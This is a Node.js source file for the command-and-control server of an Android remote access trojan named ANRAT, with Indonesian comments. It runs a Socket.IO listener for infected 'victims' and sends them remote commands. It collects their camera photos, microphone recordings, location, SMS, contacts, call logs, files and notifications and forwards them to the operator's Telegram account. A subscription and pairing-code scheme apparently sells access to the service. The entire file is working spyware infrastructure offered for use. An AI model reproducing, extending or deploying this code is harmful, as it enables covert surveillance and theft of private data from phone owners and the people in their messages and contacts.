require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mysql = require('mysql2/promise');
const { Server } = require('socket.io'); // ← PERBAIKAN DI SINI
const http = require('http'); // ← TAMBAHAN
const geoip = require('geoip-lite');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const API_PORT = process.env.API_PORT || 3000;
const RAT_PORT = process.env.RAT_PORT || 42474;
const BOT_TOKEN = process.env.BOT_TOKEN;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Database Pool
const db = mysql.createPool({
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'anrat',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// In-memory victims storage
const victims = {};
let ratServer = null;
let ratHttpServer = null; // ← TAMBAHAN

// ========================================
// TELEGRAM HELPER FUNCTIONS
// ========================================

async function sendTelegramMessage(chatId, message, options = {}) {
  if (!BOT_TOKEN) return;
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      ...options
    });
    console.log(`✅ Message sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
  }
}

async function sendTelegramPhoto(chatId, photoBuffer, caption = '') {
  if (!BOT_TOKEN) return;
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('photo', photoBuffer, { filename: 'photo.jpg' });
    if (caption) {
      form.append('caption', caption);
      form.append('parse_mode', 'Markdown');
    }

    await axios.post(`${TELEGRAM_API}/sendPhoto`, form, {
      headers: form.getHeaders()
    });
    console.log(`✅ Photo sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram photo:', error.message);
  }
}

async function sendTelegramLocation(chatId, latitude, longitude, caption = '') {
  if (!BOT_TOKEN) return;
  try {
    await axios.post(`${TELEGRAM_API}/sendLocation`, {
      chat_id: chatId,
      latitude: latitude,
      longitude: longitude
    });
    
    if (caption) {
      await sendTelegramMessage(chatId, caption);
    }
    console.log(`✅ Location sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram location:', error.message);
  }
}

async function sendTelegramDocument(chatId, documentBuffer, filename, caption = '') {
  if (!BOT_TOKEN) return;
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('document', documentBuffer, { filename: filename });
    if (caption) {
      form.append('caption', caption);
      form.append('parse_mode', 'Markdown');
    }

    await axios.post(`${TELEGRAM_API}/sendDocument`, form, {
      headers: form.getHeaders()
    });
    console.log(`✅ Document sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram document:', error.message);
  }
}

async function sendTelegramAudio(chatId, audioBuffer, caption = '') {
  if (!BOT_TOKEN) return;
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('audio', audioBuffer, { filename: 'audio.mp3' });
    if (caption) {
      form.append('caption', caption);
      form.append('parse_mode', 'Markdown');
    }

    await axios.post(`${TELEGRAM_API}/sendAudio`, form, {
      headers: form.getHeaders()
    });
    console.log(`✅ Audio sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram audio:', error.message);
  }
}

// ========================================
// DATABASE HELPER FUNCTIONS
// ========================================

async function getPairingCode(code) {
  try {
    const [rows] = await db.execute(
      `SELECT pc.*, s.type, s.users, s.telegram_id
       FROM pairing_codes pc 
       JOIN subscriptions s ON pc.subscription_id = s.id 
       WHERE pc.pairing_code = ? 
       AND pc.used = 0 
       AND pc.expires_at > NOW()`,
      [code]
    );
    return rows[0] || null;
  } catch (error) {
    console.error('Error getting pairing code:', error);
    return null;
  }
}

async function usePairingCode(code, deviceId) {
  try {
    const [result] = await db.execute(
      'UPDATE pairing_codes SET used = 1, used_at = NOW(), device_id = ? WHERE pairing_code = ?',
      [deviceId, code]
    );
    return result.affectedRows > 0;
  } catch (error) {
    console.error('Error using pairing code:', error);
    return false;
  }
}

async function addDevice(subscriptionId, telegramId, deviceId, deviceName) {
  try {
    const [existing] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ?',
      [deviceId]
    );

    if (existing.length > 0) {
      await db.execute(
        'UPDATE devices SET last_active = NOW(), status = "active" WHERE device_id = ?',
        [deviceId]
      );
      return existing[0].id;
    } else {
      const [result] = await db.execute(
        'INSERT INTO devices (subscription_id, telegram_id, device_id, device_name, last_active) VALUES (?, ?, ?, ?, NOW())',
        [subscriptionId, telegramId, deviceId, deviceName]
      );
      return result.insertId;
    }
  } catch (error) {
    console.error('Error adding device:', error);
    return null;
  }
}

async function getDevicesByTelegramId(telegramId) {
  try {
    const [rows] = await db.execute(
      `SELECT d.*, s.type 
       FROM devices d 
       JOIN subscriptions s ON d.subscription_id = s.id 
       WHERE d.telegram_id = ? 
       AND d.status = 'active' 
       ORDER BY d.last_active DESC`,
      [telegramId]
    );
    return rows;
  } catch (error) {
    console.error('Error getting devices:', error);
    return [];
  }
}

async function updateDeviceLastActive(deviceId) {
  try {
    await db.execute(
      'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
      [deviceId]
    );
    return true;
  } catch (error) {
    console.error('Error updating device:', error);
    return false;
  }
}

async function verifyDeviceOwnership(deviceId, telegramId) {
  try {
    const [rows] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = "active"',
      [deviceId, telegramId]
    );
    return rows.length > 0;
  } catch (error) {
    console.error('Error verifying ownership:', error);
    return false;
  }
}

// ========================================
// SOCKET.IO RAT SERVER
// ========================================

function startRATServer(port = RAT_PORT) {
  if (ratServer) {
    console.log('⚠️  RAT Server already running');
    return false;
  }

  try {
    // ========================================
    // PERBAIKAN: Cara inisialisasi Socket.IO v4+
    // ========================================
    ratHttpServer = http.createServer();
    ratServer = new Server(ratHttpServer, {
      maxHttpBufferSize: 1024 * 1024 * 100,
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      },
      pingInterval: 10000,
      pingTimeout: 10000
    });

    ratServer.on('connection', async (socket) => {
      const address = socket.request.connection;
      const query = socket.handshake.query;
      
      const deviceId = query.id;
      const pairingCode = query.pairing_code;
      const ip = address.remoteAddress?.substring(address.remoteAddress.lastIndexOf(':') + 1) || 'unknown';
      
      let country = null;
      const geo = geoip.lookup(ip);
      if (geo) country = geo.country.toLowerCase();

      console.log(`\n🔌 New connection attempt:`);
      console.log(`   Device ID: ${deviceId}`);
      console.log(`   Pairing Code: ${pairingCode}`);
      console.log(`   IP: ${ip}`);

      // Validate pairing code
      if (!pairingCode) {
        console.log('   ❌ No pairing code provided');
        socket.emit('error', { message: 'Pairing code required' });
        socket.disconnect();
        return;
      }

      const pairingData = await getPairingCode(pairingCode);
      
      if (!pairingData) {
        console.log('   ❌ Invalid or expired pairing code');
        socket.emit('error', { message: 'Invalid or expired pairing code' });
        socket.disconnect();
        return;
      }

      console.log(`   ✅ Valid pairing code for user: ${pairingData.telegram_id}`);

      // Check device limit
      const existingDevices = await getDevicesByTelegramId(pairingData.telegram_id);
      const maxDevices = pairingData.users === 0 ? Infinity : parseInt(pairingData.users);
      
      if (existingDevices.length >= maxDevices) {
        console.log(`   ❌ Device limit reached: ${existingDevices.length}/${maxDevices}`);
        socket.emit('error', { message: 'Device limit reached' });
        socket.disconnect();
        return;
      }

      // Mark as used & add device
      await usePairingCode(pairingCode, deviceId);
      const deviceName = `${query.manf} ${query.model}`;
      await addDevice(pairingData.subscription_id, pairingData.telegram_id, deviceId, deviceName);

      console.log(`   ✅ Device paired successfully!`);

      // Send Telegram notification
      await sendTelegramMessage(pairingData.telegram_id, `
🎉 *New Device Connected!*

📱 Device: ${deviceName}
🆔 ID: \`${deviceId}\`
🌍 IP: ${ip}
📍 Country: ${country || 'Unknown'}
📅 Time: ${new Date().toLocaleString('id-ID')}

Gunakan /victims untuk melihat devices online.
      `);

      // Store victim data
      victims[deviceId] = {
        socket: socket,
        deviceId: deviceId,
        ip: ip,
        port: address.remotePort,
        country: country,
        manufacturer: query.manf,
        model: query.model,
        release: query.release,
        telegramId: pairingData.telegram_id,
        subscriptionId: pairingData.subscription_id,
        connectedAt: new Date()
      };

      await updateDeviceLastActive(deviceId);

      // Emit success
      socket.emit('paired', { 
        success: true, 
        message: 'Device paired successfully',
        deviceId: deviceId 
      });

      // ========================================
      // HANDLE VICTIM RESPONSES
      // ========================================

      // Camera response
      socket.on('x0000ca', async (data) => {
        try {
          console.log(`📸 Camera data from ${deviceId}`);
          
          if (data.image && data.buffer) {
            const photoBuffer = Buffer.from(data.buffer);
            await sendTelegramPhoto(
              pairingData.telegram_id,
              photoBuffer,
              `📸 *Camera Capture*\n\nDevice: ${deviceName}\nTime: ${new Date().toLocaleString('id-ID')}`
            );
          }
        } catch (error) {
          console.error('Error handling camera data:', error);
        }
      });

      // Location response
      socket.on('x0000lm', async (data) => {
        try {
          console.log(`📍 Location data from ${deviceId}`);
          
          if (data.enable && data.lat && data.lng) {
            await sendTelegramLocation(
              pairingData.telegram_id,
              parseFloat(data.lat),
              parseFloat(data.lng),
              `📍 *Device Location*\n\nDevice: ${deviceName}\nLat: ${data.lat}\nLng: ${data.lng}\nTime: ${new Date().toLocaleString('id-ID')}`
            );
          } else {
            await sendTelegramMessage(
              pairingData.telegram_id,
              `❌ Location service tidak aktif pada device ${deviceName}`
            );
          }
        } catch (error) {
          console.error('Error handling location data:', error);
        }
      });

      // SMS response
      socket.on('x0000sm', async (data) => {
        try {
          console.log(`💬 SMS data from ${deviceId}`);
          
          if (data.smsList && Array.isArray(data.smsList)) {
            let smsText = `💬 *SMS List (${data.smsList.length})*\n\nDevice: ${deviceName}\n\n`;
            
            data.smsList.slice(0, 20).forEach((sms, index) => {
              smsText += `${index + 1}. ${sms.phoneNo}\n   ${sms.msg.substring(0, 50)}...\n\n`;
            });
            
            if (data.smsList.length > 20) {
              smsText += `\n... dan ${data.smsList.length - 20} SMS lainnya`;
            }
            
            await sendTelegramMessage(pairingData.telegram_id, smsText);
            
            // Send as CSV
            const csvContent = 'Phone,Message\n' + data.smsList.map(sms => 
              `"${sms.phoneNo}","${sms.msg.replace(/"/g, '""')}"`
            ).join('\n');
            const csvBuffer = Buffer.from(csvContent, 'utf-8');
            await sendTelegramDocument(
              pairingData.telegram_id,
              csvBuffer,
              `sms_${deviceId}_${Date.now()}.csv`,
              `📄 Complete SMS list from ${deviceName}`
            );
          }
        } catch (error) {
          console.error('Error handling SMS data:', error);
        }
      });

      // Contacts response
      socket.on('x0000cn', async (data) => {
        try {
          console.log(`👥 Contacts data from ${deviceId}`);
          
          if (data.contactsList && Array.isArray(data.contactsList)) {
            let contactText = `👥 *Contacts (${data.contactsList.length})*\n\nDevice: ${deviceName}\n\n`;
            
            data.contactsList.slice(0, 20).forEach((contact, index) => {
              contactText += `${index + 1}. ${contact.name}\n   ${contact.phoneNo}\n\n`;
            });
            
            if (data.contactsList.length > 20) {
              contactText += `\n... dan ${data.contactsList.length - 20} kontak lainnya`;
            }
            
            await sendTelegramMessage(pairingData.telegram_id, contactText);
            
            // Send as CSV
            const csvContent = 'Name,Phone\n' + data.contactsList.map(c => 
              `"${c.name}","${c.phoneNo}"`
            ).join('\n');
            const csvBuffer = Buffer.from(csvContent, 'utf-8');
            await sendTelegramDocument(
              pairingData.telegram_id,
              csvBuffer,
              `contacts_${deviceId}_${Date.now()}.csv`,
              `📄 Complete contacts from ${deviceName}`
            );
          }
        } catch (error) {
          console.error('Error handling contacts data:', error);
        }
      });

      // Call logs response
      socket.on('x0000cl', async (data) => {
        try {
          console.log(`📞 Call logs from ${deviceId}`);
          
          if (data.callsList && Array.isArray(data.callsList)) {
            let callText = `📞 *Call Logs (${data.callsList.length})*\n\nDevice: ${deviceName}\n\n`;
            
            data.callsList.slice(0, 20).forEach((call, index) => {
              const type = call.type === 1 ? '📥 IN' : '📤 OUT';
              const name = call.name || 'Unknown';
              callText += `${index + 1}. ${type} ${call.phoneNo}\n   ${name} - ${call.duration}s\n\n`;
            });
            
            if (data.callsList.length > 20) {
              callText += `\n... dan ${data.callsList.length - 20} call logs lainnya`;
            }
            
            await sendTelegramMessage(pairingData.telegram_id, callText);
            
            // Send as CSV
            const csvContent = 'Phone,Name,Duration,Type\n' + data.callsList.map(c => {
              const type = c.type === 1 ? 'INCOMING' : 'OUTGOING';
              const name = c.name || 'Unknown';
              return `"${c.phoneNo}","${name}","${c.duration}","${type}"`;
            }).join('\n');
            const csvBuffer = Buffer.from(csvContent, 'utf-8');
            await sendTelegramDocument(
              pairingData.telegram_id,
              csvBuffer,
              `calls_${deviceId}_${Date.now()}.csv`,
              `📄 Complete call logs from ${deviceName}`
            );
          }
        } catch (error) {
          console.error('Error handling call logs:', error);
        }
      });

      // Microphone response
      socket.on('x0000mc', async (data) => {
        try {
          console.log(`🎤 Audio data from ${deviceId}`);
          
          if (data.file && data.buffer) {
            const audioBuffer = Buffer.from(data.buffer);
            await sendTelegramAudio(
              pairingData.telegram_id,
              audioBuffer,
              `🎤 *Audio Recording*\n\nDevice: ${deviceName}\nTime: ${new Date().toLocaleString('id-ID')}`
            );
          }
        } catch (error) {
          console.error('Error handling audio data:', error);
        }
      });

      // File Manager response
      socket.on('x0000fm', async (data) => {
        try {
          console.log(`📁 File data from ${deviceId}`);
          
          if (data.file && data.buffer) {
            const fileBuffer = Buffer.from(data.buffer);
            await sendTelegramDocument(
              pairingData.telegram_id,
              fileBuffer,
              data.name || 'file',
              `📁 *File from Device*\n\nDevice: ${deviceName}\nFile: ${data.name}`
            );
          }
        } catch (error) {
          console.error('Error handling file data:', error);
        }
      });

      // Notification response
      socket.on('x0000nf', async (data) => {
        try {
          console.log(`🔔 Notification data from ${deviceId}`);
          
          if (data.packageName) {
            const notifText = `🔔 *New Notification*\n\nDevice: ${deviceName}\nApp: ${data.packageName}\nTitle: ${data.title || 'N/A'}\nText: ${data.text || 'N/A'}\nTime: ${new Date(data.postTime).toLocaleString('id-ID')}`;
            await sendTelegramMessage(pairingData.telegram_id, notifText);
          } else if (data.hasOwnProperty('enabled')) {
            const statusText = data.enabled 
              ? `✅ Notification Access is enabled on ${deviceName}`
              : `❌ Notification Access is disabled on ${deviceName}`;
            await sendTelegramMessage(pairingData.telegram_id, statusText);
          }
        } catch (error) {
          console.error('Error handling notification data:', error);
        }
      });

      // Generic order handler
      socket.on('order', (data) => {
        console.log(`📨 Order from ${deviceId}:`, data.order);
      });

      // Handle disconnect
      socket.on('disconnect', async () => {
        console.log(`\n🔌 Device disconnected: ${deviceId}`);
        
        try {
          await db.execute(
            'UPDATE devices SET status = "inactive" WHERE device_id = ?',
            [deviceId]
          );
          
          await sendTelegramMessage(pairingData.telegram_id, `
⚠️ *Device Disconnected*

📱 Device: ${deviceName}
🆔 ID: \`${deviceId}\`
📅 Time: ${new Date().toLocaleString('id-ID')}
          `);
        } catch (error) {
          console.error('Error handling disconnect:', error);
        }
        
        delete victims[deviceId];
      });
    });

    // ========================================
    // START LISTENING
    // ========================================
    ratHttpServer.listen(port, () => {
      console.log(`✅ RAT Server started on port ${port}`);
    });

    return true;
  } catch (error) {
    console.error('❌ Failed to start RAT server:', error);
    return false;
  }
}

function stopRATServer() {
  if (!ratServer) return false;

  try {
    ratServer.close();
    if (ratHttpServer) {
      ratHttpServer.close();
    }
    ratServer = null;
    ratHttpServer = null;
    Object.keys(victims).forEach(key => delete victims[key]);
    console.log('✅ RAT Server stopped');
    return true;
  } catch (error) {
    console.error('❌ Failed to stop RAT server:', error);
    return false;
  }
}

// ========================================
// REST API ENDPOINTS
// ========================================

app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    status: 'running', 
    version: '2.0.0',
    ratServer: ratServer !== null,
    connectedDevices: Object.keys(victims).length,
    telegram: BOT_TOKEN ? 'enabled' : 'disabled'
  });
});

app.get('/api/victims', async (req, res) => {
  try {
    const { telegram_id } = req.query;
    
    if (!telegram_id) {
      return res.status(400).json({ 
        success: false, 
        error: 'telegram_id required' 
      });
    }

    const devices = await getDevicesByTelegramId(telegram_id);
    const deviceIds = devices.map(d => d.device_id);

    const userVictims = Object.values(victims)
      .filter(v => deviceIds.includes(v.deviceId))
      .map(v => ({
        deviceId: v.deviceId,
        ip: v.ip,
        port: v.port,
        country: v.country,
        manufacturer: v.manufacturer,
        model: v.model,
        release: v.release,
        connectedAt: v.connectedAt
      }));

    res.json({ 
      success: true, 
      victims: userVictims,
      total: userVictims.length
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/victims/:deviceId/command', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, order, extra, data } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    if (!order) {
      return res.status(400).json({ success: false, error: 'Order is required' });
    }

    victim.socket.emit('order', { order, extra, ...data });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Command sent successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Subscription management
app.get('/api/subscriptions', async (req, res) => {
  try {
    const [rows] = await db.execute('SELECT * FROM subscriptions ORDER BY created_at DESC');
    res.json(rows);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.put('/api/subscriptions/:id/approve', async (req, res) => {
  try {
    const { id } = req.params;
    const activationCode = generateActivationCode();
    
    await db.execute(
      'UPDATE subscriptions SET status = "approved", activation_code = ? WHERE id = ?',
      [activationCode, id]
    );

    const [sub] = await db.execute('SELECT * FROM subscriptions WHERE id = ?', [id]);
    if (sub.length > 0 && sub[0].telegram_id) {
      await sendTelegramMessage(sub[0].telegram_id, `
✅ *Order Approved!*

Order ID: ${id}
Kode Aktivasi: \`${activationCode}\`

Gunakan /activate ${activationCode} untuk mengaktifkan subscription.
      `);
    }

    res.json({ success: true, activationCode });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.put('/api/subscriptions/:id/reject', async (req, res) => {
  try {
    const { id } = req.params;
    const { reason } = req.body;
    
    await db.execute('UPDATE subscriptions SET status = "rejected" WHERE id = ?', [id]);

    const [sub] = await db.execute('SELECT * FROM subscriptions WHERE id = ?', [id]);
    if (sub.length > 0 && sub[0].telegram_id) {
      await sendTelegramMessage(sub[0].telegram_id, `
❌ *Order Rejected*

Order ID: ${id}
${reason ? `Alasan: ${reason}` : ''}

Silakan hubungi admin jika ada pertanyaan.
      `);
    }

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Telegram photo proxy
app.get('/api/telegram/download/:fileId', async (req, res) => {
  try {
    const { fileId } = req.params;
    
    const fileResponse = await axios.get(`${TELEGRAM_API}/getFile?file_id=${fileId}`);
    const filePath = fileResponse.data.result.file_path;
    
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
    const imageResponse = await axios.get(fileUrl, { responseType: 'arraybuffer' });
    
    res.set('Content-Type', 'image/jpeg');
    res.send(imageResponse.data);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

function generateActivationCode() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let code = '';
  for (let i = 0; i < 8; i++) {
    if (i === 4) code += '-';
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}

// ========================================
// START SERVER
// ========================================

db.getConnection()
  .then(connection => {
    console.log('✅ Database connected!');
    connection.release();
    
    app.listen(API_PORT, () => {
      console.log(`\n🚀 ANRAT API Server: http://localhost:${API_PORT}/api`);
      console.log(`📡 Telegram: ${BOT_TOKEN ? 'Enabled' : 'Disabled'}`);
    });
    
    startRATServer(RAT_PORT);
    
  })
  .catch(error => {
    console.error('❌ Database connection failed:', error);
    process.exit(1);
  });

process.on('SIGINT', () => {
  console.log('\n⏹️  Shutting down...');
  stopRATServer();
  db.end();
  process.exit(0);
});